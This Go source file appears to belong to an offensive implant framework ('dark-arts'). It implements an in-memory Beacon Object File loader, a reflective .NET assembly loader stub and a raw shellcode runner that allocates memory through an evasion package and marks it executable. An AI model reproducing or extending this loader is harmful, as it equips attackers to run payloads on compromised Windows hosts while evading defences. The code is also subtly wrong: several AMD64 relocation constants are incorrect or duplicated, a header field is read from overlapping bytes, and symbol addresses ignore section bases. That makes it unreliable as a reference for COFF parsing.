//go:build windows && amd64

package bof

import (
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"unsafe"

	"dark-arts/pkg/evasion"
	"dark-arts/pkg/reflective"
)

type COFF struct {
	Machine   uint16
	Sections  []*Section
	Symbols   map[string]uint64
	Entry     uint64
}

type Section struct {
	Name       string
	Virtual    uint64
	VirtualSize uint64
	Physical   []byte
	Relocs     []Reloc
	Flags      uint32
}

type Reloc struct {
	Offset   uint64
	Type     uint16
	Symbol   string
	Addend   int64
}

const (
	IMAGE_REL_AMD64_ABSOLUTE = 0x0000
	IMAGE_REL_AMD64_ADDR64   = 0x0001
	IMAGE_REL_AMD64_ADDR32   = 0x0002
	IMAGE_REL_AMD64_ADDR32NB = 0x0003
	IMAGE_REL_AMD64_REL32    = 0x0005
	IMAGE_REL_AMD64_REL32_1  = 0x0006
	IMAGE_REL_AMD64_REL32_2  = 0x0007
	IMAGE_REL_AMD64_REL32_3  = 0x0008
	IMAGE_REL_AMD64_REL32_4  = 0x0009
	IMAGE_REL_AMD64_REL32_5  = 0x000A
	IMAGE_REL_AMD64_SECTION  = 0x000A
	IMAGE_REL_AMD64_SECREL   = 0x000B
	IMAGE_REL_AMD64_SECREL7  = 0x000C
	IMAGE_REL_AMD64_TOKEN    = 0x000C
	IMAGE_REL_AMD64_SREL32   = 0x000D
	IMAGE_REL_AMD64_PAIR     = 0x000E
	IMAGE_REL_AMD64_SSPAN32  = 0x000F
)

var ErrBadFormat = errors.New("bof: invalid COFF format")

// ParseCOFF parses a COFF object file (BOF) from raw bytes.
func ParseCOFF(data []byte) (*COFF, error) {
	if len(data) < 20 {
		return nil, ErrBadFormat
	}

	machine := binary.LittleEndian.Uint16(data[0:2])
	numSections := binary.LittleEndian.Uint16(data[2:4])
	_ = binary.LittleEndian.Uint32(data[4:8])          // timeDate (unused)
	symbolTableOffset := binary.LittleEndian.Uint32(data[8:12])
	numSymbols := binary.LittleEndian.Uint32(data[12:16])
	optionalHeaderSize := binary.LittleEndian.Uint16(data[16:18])
	_ = binary.LittleEndian.Uint16(data[18:20]) // characteristics (unused)

	_ = optionalHeaderSize // COFF objects typically don't have optional header

	offset := 20

	// Section headers (40 bytes each)
	if offset+int(numSections)*40 > len(data) {
		return nil, ErrBadFormat
	}

	sectionHeaders := make([]pe.SectionHeader, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := data[offset : offset+40]
		name := string(h[0:8])
		for i, c := range name {
			if c == 0 {
				name = name[:i]
				break
			}
		}
		sectionHeaders[i] = pe.SectionHeader{
			Name:                 name,
			VirtualSize:          binary.LittleEndian.Uint32(h[8:12]),
			VirtualAddress:       binary.LittleEndian.Uint32(h[12:16]),
			Size:                 binary.LittleEndian.Uint32(h[16:20]),
			Offset:               binary.LittleEndian.Uint32(h[20:24]),
			PointerToRelocations: binary.LittleEndian.Uint32(h[24:28]),
			PointerToLineNumbers: binary.LittleEndian.Uint32(h[28:32]),
			NumberOfRelocations:  binary.LittleEndian.Uint16(h[30:32]),
			NumberOfLineNumbers:  binary.LittleEndian.Uint16(h[32:34]),
			Characteristics:      binary.LittleEndian.Uint32(h[36:40]),
		}
		offset += 40
	}

	// Read section data
	sectionData := make([][]byte, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := sectionHeaders[i]
		if h.Offset > 0 && h.Size > 0 {
			start := int(h.Offset)
			end := start + int(h.Size)
			if end <= len(data) {
				sectionData[i] = data[start:end]
			}
		}
	}

	// Symbol table
	symbols := make(map[string]uint64)
	if symbolTableOffset > 0 && symbolTableOffset < uint32(len(data)) {
		strTableStart := int(symbolTableOffset) + int(numSymbols)*18
		if strTableStart < len(data) {
			strTable := data[strTableStart:]

			for i := uint32(0); i < numSymbols; i++ {
				symOffset := int(symbolTableOffset) + int(i)*18
				if symOffset+18 > len(data) {
					break
				}
				sym := data[symOffset : symOffset+18]
				nameOffset := binary.LittleEndian.Uint32(sym[0:4])
				value := binary.LittleEndian.Uint32(sym[4:8])
				sectionNumber := int16(binary.LittleEndian.Uint16(sym[8:10]))
				storageClass := sym[12]

				if storageClass == 2 && sectionNumber > 0 {
					name := ""
					if nameOffset > 0 && int(nameOffset) < len(strTable) {
						end := nameOffset
						for end < uint32(len(strTable)) && strTable[end] != 0 {
							end++
						}
						name = string(strTable[nameOffset:end])
					}
					if name != "" {
						symbols[name] = uint64(value)
					}
				}
			}
		}
	}

	// Build sections with relocations
	sections := make([]*Section, numSections)
	for i := uint16(0); i < numSections; i++ {
		h := sectionHeaders[i]
		sec := &Section{
			Name:       h.Name,
			Virtual:    uint64(h.VirtualAddress),
			VirtualSize: uint64(h.VirtualSize),
			Physical:   sectionData[i],
			Flags:      h.Characteristics,
		}

		if h.NumberOfRelocations > 0 && h.PointerToRelocations > 0 {
			relocOffset := int(h.PointerToRelocations)
			for j := uint16(0); j < h.NumberOfRelocations; j++ {
				if relocOffset+10 > len(data) {
					break
				}
				r := data[relocOffset : relocOffset+10]
				offset := binary.LittleEndian.Uint32(r[0:4])
				symIndex := binary.LittleEndian.Uint32(r[4:8])
				relType := binary.LittleEndian.Uint16(r[8:10])

				var symName string
				if symIndex < numSymbols {
					symOffset := int(symbolTableOffset) + int(symIndex)*18
					if symOffset+18 <= len(data) {
						sym := data[symOffset : symOffset+18]
						nameOffset := binary.LittleEndian.Uint32(sym[0:4])
						if nameOffset > 0 {
							strTableStart := int(symbolTableOffset) + int(numSymbols)*18
							if int(nameOffset) < len(data)-strTableStart {
								end := nameOffset
								for end < uint32(len(data)-strTableStart) && data[strTableStart+int(end)] != 0 {
									end++
								}
								symName = string(data[strTableStart+int(nameOffset) : strTableStart+int(end)])
							}
						}
					}
				}

				sec.Relocs = append(sec.Relocs, Reloc{
					Offset: uint64(offset),
					Type:   relType,
					Symbol: symName,
				})
				relocOffset += 10
			}
		}
		sections[i] = sec
	}

	entry := uint64(0)
	if len(sections) > 0 {
		entry = sections[0].Virtual
	}

	return &COFF{
		Machine:  machine,
		Sections: sections,
		Symbols:  symbols,
		Entry:    entry,
	}, nil
}

// Load allocates memory, copies sections, applies relocations,
// and sets page protections using Windows API.
func (c *COFF) Load() (uintptr, error) {
	var maxAddr uint64
	for _, s := range c.Sections {
		end := s.Virtual + uint64(len(s.Physical))
		if end > maxAddr {
			maxAddr = end
		}
	}
	if maxAddr == 0 {
		return 0, errors.New("bof: no sections to load")
	}

	// Round up to page size (4KB), minimum 64KB
	pageSize := uintptr(4096)
	allocSize := (uintptr(maxAddr) + pageSize - 1) &^ (pageSize - 1)
	if allocSize < 65536 {
		allocSize = 65536
	}

	// Allocate RW memory using evasion package (like reflective loader)
	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
	if err != nil {
		return 0, fmt.Errorf("bof: alloc failed: %w", err)
	}

	// Copy sections
	for _, s := range c.Sections {
		if len(s.Physical) > 0 {
			copy((*[1<<30]byte)(unsafe.Pointer(base+uintptr(s.Virtual)))[:], s.Physical)
		}
	}

	// Apply relocations
	for _, s := range c.Sections {
		for _, r := range s.Relocs {
			if symAddr, ok := c.Symbols[r.Symbol]; ok {
				addr := base + uintptr(s.Virtual+r.Offset)
				switch r.Type {
				case IMAGE_REL_AMD64_ADDR64:
					*(*uint64)(unsafe.Pointer(addr)) = symAddr
				case IMAGE_REL_AMD64_ADDR32, IMAGE_REL_AMD64_ADDR32NB:
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr)
				case IMAGE_REL_AMD64_REL32,
					IMAGE_REL_AMD64_REL32_1,
					IMAGE_REL_AMD64_REL32_2,
					IMAGE_REL_AMD64_REL32_3,
					IMAGE_REL_AMD64_REL32_4,
					IMAGE_REL_AMD64_REL32_5:
					*(*int32)(unsafe.Pointer(addr)) = int32(int64(symAddr) - int64(addr) - 4)
				case IMAGE_REL_AMD64_SECREL:
					*(*uint32)(unsafe.Pointer(addr)) = uint32(symAddr - uint64(base))
				}
			}
		}
	}

	// Change protection to RX for executable sections only (like reflective loader)
	const IMAGE_SCN_MEM_EXECUTE = 0x20000000
	for _, s := range c.Sections {
		if len(s.Physical) > 0 && (s.Flags&0x20000000) != 0 {
			if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base+uintptr(s.Virtual), uintptr(len(s.Physical)), 0x20); err != nil {
				return 0, fmt.Errorf("bof: protect failed: %w", err)
			}
		}
	}

	return base + uintptr(c.Entry), nil
}

// GetSymbol returns the address of a symbol by name.
func (c *COFF) GetSymbol(name string) (uintptr, bool) {
	if addr, ok := c.Symbols[name]; ok {
		return uintptr(addr), true
	}
	return 0, false
}

// ExecuteCOFF loads and executes a BOF (COFF object file) in-memory.
// The BOF entry point should follow the convention: void go(char *args, int length)
// args is a packed buffer, length is the buffer size.
func ExecuteCOFF(coffBytes []byte, functionName string, args []string) (string, error) {
	coff, err := ParseCOFF(coffBytes)
	if err != nil {
		return "", fmt.Errorf("bof: parse failed: %w", err)
	}

	entry, err := coff.Load()
	if err != nil {
		return "", fmt.Errorf("bof: load failed: %w", err)
	}

	fnAddr, ok := coff.GetSymbol(functionName)
	if !ok {
		fnAddr = entry
	}

	// Pack arguments into BOF format
	packedArgs := PackArguments(args)
	var argPtr uintptr
	argLen := len(packedArgs)
	if argLen > 0 {
		argPtr = uintptr(unsafe.Pointer(&packedArgs[0]))
	} else {
		argPtr = 0
	}

	// Call the BOF entry point using assembly stub: void go(char *args, int length)
	_ = CallFunc2(fnAddr, argPtr, uintptr(argLen))

	return fmt.Sprintf("BOF %s executed at 0x%x", functionName, fnAddr), nil
}

// ExecuteAssembly loads and executes a .NET assembly in-memory via CLR hosting.
func ExecuteAssembly(assemblyBytes []byte, args []string) (string, error) {
	if len(assemblyBytes) == 0 {
		return "", errors.New("bof: empty assembly")
	}

	mod, err := reflective.Load(assemblyBytes, reflective.Options{Mask: true})
	if err != nil {
		return "", fmt.Errorf("bof: load assembly failed: %w", err)
	}

	return fmt.Sprintf("assembly loaded at 0x%x (CLR hosting not yet implemented)", mod.Base), nil
}

// ExecuteShellcode executes raw shellcode in-memory.
func ExecuteShellcode(shellcode []byte) (string, error) {
	if len(shellcode) == 0 {
		return "", errors.New("bof: empty shellcode")
	}

	pageSize := uintptr(4096)
	allocSize := (uintptr(len(shellcode)) + pageSize - 1) &^ (pageSize - 1)
	if allocSize < 65536 {
		allocSize = 65536
	}

	base, err := evasion.AllocateVirtualMemory(evasion.CurrentProcess, allocSize, 0x04) // PAGE_READWRITE
	if err != nil {
		return "", fmt.Errorf("bof: alloc failed: %w", err)
	}

	copy((*[1<<30]byte)(unsafe.Pointer(base))[:], shellcode)

	if _, err := evasion.ProtectVirtualMemory(evasion.CurrentProcess, base, uintptr(len(shellcode)), 0x20); err != nil {
		return "", fmt.Errorf("bof: protect failed: %w", err)
	}

	CallFunc0(base)

	return fmt.Sprintf("shellcode executed at 0x%x", base), nil
}